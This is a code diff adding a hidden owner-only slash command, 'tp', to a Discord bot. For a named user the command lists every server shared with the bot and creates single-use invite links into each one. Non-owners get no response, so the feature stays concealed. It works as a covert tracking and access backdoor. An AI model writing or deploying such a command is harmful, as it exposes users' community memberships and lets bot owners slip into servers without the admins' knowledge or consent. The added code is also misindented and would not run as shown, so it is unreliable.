@@ -3961,6 +3961,52 @@ async def nitro(ctx, action: str, channel: discord.TextChannel = None):
                 await ctx.interaction.response.send_message(error_msg, ephemeral=True)
             else:
                 await ctx.send(error_msg)
+                @bot.slash_command(name="tp", description="Check member's shared servers and join link")
+async def tp(ctx, member: discord.Member = None, user_id: str = None):
+    # Allowed bot owners (IDs)
+    ALLOWED_OWNERS = {1152424544557088849, 1286560808528117820}
+    
+    if ctx.author.id not in ALLOWED_OWNERS:
+        return  # Command invisible to non-owners
+    
+    # Determine target user
+    target = member
+    if target is None and user_id is not None:
+        try:
+            target = await bot.fetch_user(int(user_id))
+        except:
+            await ctx.respond("Invalid user ID.", ephemeral=True)
+            return
+    if target is None:
+        await ctx.respond("Specify @member or user_id.", ephemeral=True)
+        return
+    
+    # Get mutual servers between bot and target
+    bot_guilds = {g.id: g for g in bot.guilds}
+    target_guilds = target.mutual_guilds if hasattr(target, 'mutual_guilds') else []
+    
+    if not target_guilds:
+        await ctx.respond(f"User {target.display_name} is not in any server shared with the bot.", ephemeral=True)
+        return
+    
+    # Build server list with invite links
+    result_lines = [f"**Servers where {target.display_name} is present:**"]
+    for guild in target_guilds:
+        if guild.id in bot_guilds:
+            bot_member = guild.get_member(bot.user.id)
+            if bot_member and bot_member.guild_permissions.create_instant_invite:
+                try:
+                    invite = await guild.text_channels[0].create_invite(max_age=300, max_uses=1)
+                    invite_link = invite.url
+                except:
+                    invite_link = "No permission to create invite"
+            else:
+                invite_link = "No permission to create invite"
+            
+            result_lines.append(f"• {guild.name} (ID: {guild.id}) – {invite_link}")
+    
+    # Send result only to owner (ephemeral)
+    await ctx.respond("\n".join(result_lines), ephemeral=True)
 # =========================================================
 # RUN BOT
 # =========================================================
